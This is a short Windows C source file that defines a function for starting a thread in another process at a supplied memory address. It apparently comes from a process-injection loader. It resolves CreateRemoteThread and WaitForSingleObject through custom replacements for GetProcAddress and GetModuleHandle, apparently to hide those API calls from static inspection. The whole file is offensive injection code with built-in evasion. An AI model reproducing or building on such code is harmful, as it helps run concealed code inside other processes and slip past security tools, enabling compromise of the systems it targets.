#include "common.h"

VOID RemoteThreadExecute(IN HANDLE hProcess, IN PVOID pAddress)
{
	DWORD dwThreadID = 1;
	f_CreateRemoteThread rCreateRemoteThread = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"),"CreateRemoteThread");
	HANDLE hThread = rCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, &dwThreadID);
	f_WaitForSingleObject rWaitForSingleObject = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "WaitForSingleObject");
	rWaitForSingleObject(hThread, 1000);
}